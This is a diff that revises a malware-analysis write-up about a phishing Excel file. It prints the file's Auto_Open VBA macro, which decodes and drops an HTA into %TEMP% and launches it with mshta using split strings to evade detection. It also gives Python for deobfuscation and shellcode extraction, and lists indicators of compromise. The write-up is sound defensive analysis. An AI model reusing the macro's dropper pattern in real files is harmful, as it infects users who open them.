@@ -15,9 +15,15 @@ After receiving this phishing email with this information, the link on the **dow
 
 ![alt text](/images/email.png)
 
-## The xlsx file downloadde from the email
+**Key Observations:**
 
-"By gathering its SHA256 and verifying on [VirusTotal](https://www.virustotal.com/gui/file/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705), we can tell that it is a malicious file."
+- The email uses social engineering tactics to create urgency
+- The download link points to an external hosting service
+- No legitimate business would request action through such generic messaging
+
+## The Malicious XLSX File
+
+By gathering its SHA256 and verifying on [VirusTotal](https://www.virustotal.com/gui/file/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705), we can tell that it is a malicious file.
 
 ```
 sha256sum 0nfoPg800fq06IGB.xlsx
@@ -26,9 +32,9 @@ sha256sum 0nfoPg800fq06IGB.xlsx
 
 ![alt text](/images/vtScreen.png)
 
-## Get the macro
+## Extracting the Macro
 
-Using the tool [oledump.py](https://blog.didierstevens.com/programs/oledump-py/), we could gather the malicious macro code that is embedded in this file
+Using the tool [oledump.py](https://blog.didierstevens.com/programs/oledump-py/), we can extract the malicious macro code embedded in this file:
 
 ```
 python3 oledump.py 0nfoPg800fq06IGB.xlsx
@@ -53,7 +59,7 @@ A17:       106 'VBA/__SRP_7'
 A18:       882 'VBA/dir'
 ```
 
-The full function code here :
+The `M` indicator next to streams A7 and A10 shows they contain VBA macros. Let's examine Module1:
 
 ```
 python3 oledump.py -s A7 -v  0nfoPg800fq06IGB.xlsx
@@ -221,19 +227,68 @@ End Sub
 
 ```
 
-## Any Run
+## Macro Code Analysis
+
+The extracted macro contains three main components:
+
+**1. Base64 Encoding Function (LeOyoqoF)**
+
+- Custom implementation of Base64 encoding
+- Used to obfuscate data
+
+**2. Base64 Decoding Function (hdYJNJmt)**
+
+- Decodes Base64 strings
+- Used to decode the embedded HTA file content
+
+**3. Auto-Execution Routine (Auto_Open)**
+
+```vba
+Sub Auto_Open()
+    Dim fHdswUyK, GgyYKuJh
+    Application.Goto ("JLprrpFr")
+    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
+
+    Open GgyYKuJh For Output As #1
+    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
+    Close #1
+
+    fHdswUyK = "msh" & "ta " & GgyYKuJh
+    x = Shell(fHdswUyK, 1)
+End Sub
+```
+
+**What this macro does:**
+
+1. Navigates to a specific cell range ("JLprrpFr")
+2. Constructs a file path in the user's temp directory: `%TEMP%\LwTHLrGh.hta`
+3. Decodes Base64 content from:
+   - Alternative text of Shape 2 on the active sheet
+   - Content from the UZdcUQeJ module
+   - Current selection
+4. Writes decoded content to LwTHLrGh.hta
+5. Executes the HTA file using `mshta.exe` (string concatenation to evade detection)
+
+## Dynamic Analysis
 
 ![alt text](/images/anyrun.png)
 
-By doing a dynamic analysis of this XLSX in a sandbox, we can see that the suspicious file LwTHLrGh.hta observed above is being recreated and then executed:
+By performing dynamic analysis of this XLSX file in a sandbox environment, we can observe the attack chain in real-time. The suspicious file `LwTHLrGh.hta` is created in the temp directory and then executed.
 
 - [Full AnyRun report of the xlsx file ](https://any.run/report/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705/93db2bda-f745-4f1f-b94a-db476604ddb0#Network)
 
-## Analysee the LwTHLrGh.hta
+**Key Behavioral Indicators:**
+
+- File creation in `%TEMP%` directory
+- Execution of `mshta.exe` (Windows HTML Application Host)
+- Network connections (if any - check AnyRun report)
+- Registry modifications
+
+## Analyzing the HTA File (LwTHLrGh.hta)
 
 ![alt text](/images/getAnyRun.png)
 
-The file LwTHLrGh.hta contains a macro also. Let's walk through it and explain what it will do step by step.
+The HTA file contains the second-stage payload. Let's walk through its execution flow step by step.
 
 - [Full AnyRun report of the LwTHLrGh.hta file](https://any.run/report/8d74853d271ec7a12880c4e33591df212628e3cb6a2f4038adad28c4b6891a96/465f9ebf-785a-4c91-b8e3-f572ae892de3)
 
@@ -454,11 +509,11 @@ else
 end if
 ```
 
-## Decoding the Array
+## Decoding the Obfuscated Code
 
-With this python script we can decode the obfuscated code
+To to decode the Chr() obfuscation from the HTA file, we can use this Python script:
 
-```
+```python
 import re
 
 obfuscated_code = """[paste the obfuscated code here]"""
@@ -475,13 +530,11 @@ decoded = decoded.replace('&', '')
 print(decoded)
 ```
 
-## Create the code for
+## Creating Binary File from Shellcode Array
 
-This will create a binary file where we can then analyze with [scdbg](https://sandsprite.com/CodeStuff/scdbg_manual/MANUAL_EN.html) or other shellcode analysis tools.
+To analyze the shellcode with tools like [scdbg](https://sandsprite.com/CodeStuff/scdbg_manual/MANUAL_EN.html), we first need to convert the byte array to a binary file:
 
-But First we need to create a binary file with this shellcode.
-
-```
+```python
 shellcode = [
     -35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,
 -61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127...
@@ -494,10 +547,40 @@ with open("out.bin", "wb") as out:
 
 The & 0xff operation correctly handles the negative values in your array by converting them to their unsigned byte equivalents (e.g., -35 becomes 221). This will create a binary file that you can then analyze with scdbg or other shellcode analysis tools.
 
-## ShellCode analysis
+## Shellcode Analysis with scdbg
 
 To analyze the shellcode with scdbg, we can use this command:
 
 ```
 scdbg.exe /f out.bin
 ```
+
+## Indicators of Compromise (IOCs)
+
+### File Hashes (SHA256)
+
+```
+XLSX File: 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705
+HTA File:  8d74853d271ec7a12880c4e33591df212628e3cb6a2f4038adad28c4b6891a96
+```
+
+### File Names
+
+- `0nfoPg800fq06IGB.xlsx`
+- `LwTHLrGh.hta` (created in %TEMP%)
+
+### Registry Keys Modified
+
+- `HKEY_CURRENT_USER\Software\Microsoft\Office\[version]\Excel\Security\AccessVBOM`
+
+### Process Execution Chain
+
+```
+Outlook.exe (or browser)
+  └─> Excel.exe (opens malicious XLSX)
+      └─> mshta.exe (executes HTA)
+          └─> Excel.exe (invisible instance)
+              └─> rundll32.exe (injected with shellcode)
+```
+
+---
